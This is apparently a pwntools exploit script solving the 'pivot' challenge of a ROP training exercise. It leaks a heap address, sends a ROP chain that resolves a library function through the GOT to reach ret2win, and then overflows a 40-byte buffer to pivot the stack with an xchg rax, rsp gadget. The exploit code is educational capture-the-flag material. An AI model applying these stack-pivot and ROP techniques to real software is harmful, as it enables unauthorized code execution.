# -*- coding: utf-8 -*-
from pwn import *
p = process("./pivot")
elf = ELF("./pivot")

plt_foothold_function = elf.plt["foothold_function"]
got_foothold_function = elf.got["foothold_function"]
# 0xABE - 0x970 = 334
ret2win_offset = 334
# ROPgadget --binary ./pivot --depth 20
# 0x0000000000400b00 : pop rax ; ret
# 0x0000000000400b02 : xchg rax, rsp ; ret
# 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
# 0x0000000000400b09 : add rax, rbp ; ret
# 0x0000000000400900 : pop rbp ; ret
# 0x000000000040098e : call rax
pop_rax_ret = 0x0000000000400b00
xchg_rax_rsp = 0x0000000000400b02
mov_rax_rax = 0x0000000000400b05
add_rax_rbp_ret = 0x0000000000400b09
pop_rbp_ret = 0x0000000000400900
call_rax = 0x000000000040098e

p.recvuntil("Call ret2win() from libpivot.so\n")
p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
heap_addr = int(p.recvuntil("\n").replace("\n", ""), 16)

print "heap_addr: " + hex(heap_addr)

p.recvuntil("> ")
rop_gadget = p64(plt_foothold_function)
rop_gadget += p64(pop_rax_ret) 
rop_gadget += p64(got_foothold_function)
rop_gadget += p64(mov_rax_rax)
rop_gadget += p64(pop_rbp_ret)
rop_gadget += p64(ret2win_offset)
rop_gadget += p64(add_rax_rbp_ret)
rop_gadget += p64(call_rax)

p.sendline(rop_gadget)

p.recvuntil("> ")
payload = "a" * 40 
payload += p64(pop_rax_ret)
payload += p64(heap_addr)
payload += p64(xchg_rax_rsp)
p.sendline(payload)

p.recvuntil("into libpivot.so")
p.interactive()




